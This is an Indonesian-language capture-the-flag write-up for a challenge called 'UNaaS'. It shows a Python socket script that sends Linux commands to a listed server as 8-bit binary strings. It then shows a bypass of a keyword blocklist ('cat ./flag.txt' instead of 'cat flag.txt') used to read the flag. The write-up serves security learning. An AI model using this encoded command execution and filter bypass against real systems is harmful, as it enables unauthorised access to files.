
# UNaaS

Tantangan *Network Socket* yang mengharuskan kita berkomunikasi menggunakan bahasa mesin (biner) dan melakukan bypass filter perintah Linux sederhana.

## The Scenario

Kami diberikan sebuah alamat network `31.97.37.38` port `8082` dengan deskripsi "UNNES as a Service". Tidak ada file binary atau source code yang diberikan, sehingga ini adalah tantangan *Blackbox testing*.

Langkah pertama adalah melakukan koneksi menggunakan `netcat` untuk melihat respon server.

```bash
nc 31.97.37.38 8082

```

Respon awal server sangat minim. Ketika kami mencoba mengirim perintah teks standar seperti `ls`, `help`, atau `whoami`, server menolak dengan pesan error.

```text
input command: ls
invalid command

input command: help
invalid command

```

## Reconnaissance

Kami mencoba melakukan *fuzzing* manual untuk memahami input apa yang diterima server. Input matematika Python (`1+1`) juga ditolak. Namun, kami menemukan anomali ketika mengirimkan angka biner tunggal:

* Input: `0` -> Output: `?`
* Input: `1` -> Output: `?`
* Input: `2` -> Output: `invalid command`

Ini mengindikasikan bahwa server **hanya menerima input biner (0 dan 1)**. Tanda tanya `?` kemungkinan besar berarti server sedang menunggu urutan bit lengkap (misalnya 8-bit untuk 1 karakter ASCII) sebelum memproses perintah.

Hipotesis kami: Server ini adalah "penerjemah" yang meminta kita mengirimkan perintah Linux dalam format string biner (contoh: huruf `l` = `01101100`).

## Extraction Script

Untuk mempermudah komunikasi, kami menulis script Python menggunakan library `socket`. Script ini berfungsi sebagai *wrapper* yang otomatis mengubah input teks keyboard menjadi deretan biner 8-bit sebelum dikirim ke server.

```python
import socket
import sys

HOST = '31.97.37.38'
PORT = 8082

def text_to_binary(text):
    # Konversi string ke deretan '010101...'
    return ''.join(format(ord(char), '08b') for char in text)

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    
    # Menerima banner awal
    print(s.recv(1024).decode(), end='')

    while True:
        try:
            cmd = input()
            if cmd == 'exit': break
            
            # Payload: Command -> Binary -> Server
            payload = text_to_binary(cmd)
            print(f"[*] Sending Binary Payload: {payload}")
            
            s.send(payload.encode() + b'\n')
            
            response = s.recv(4096).decode()
            print(f"[+] Server Response:\n{response}")
            
        except Exception as e:
            print(f"Error: {e}")
            break

if __name__ == "__main__":
    main()

```

Saat script dijalankan dengan perintah `ls` (yang dikirim sebagai `0110110001110011`), server akhirnya merespon dengan daftar file:

```text
[+] Server Response:
chall.py
flag.txt

```

## The Verdict

Target sudah terlihat: `flag.txt`. Namun, saat kami mencoba membaca file tersebut dengan perintah standar `cat flag.txt`, server memutus koneksi atau tidak memberikan respon.

```bash
input command: cat flag.txt
# Server crash / No Response (Broken Pipe)

```

Ini menunjukkan adanya **Bad Characters Filter** atau *blacklist* pada string input. Server kemungkinan memblokir kata `flag` atau `flag.txt`.

Kami melakukan bypass filter menggunakan teknik path traversal relatif. Dalam Linux, `./file` sama dengan `file`, tetapi string-nya berbeda.

* Payload gagal: `cat flag.txt`
* Payload sukses: `cat ./flag.txt`

Dengan payload `cat ./flag.txt` yang dikonversi ke biner, filter berhasil dilewati dan server mencetak isi flag.

> TBF1{w3_lOV3_Y0U_unNES_w3_DO}
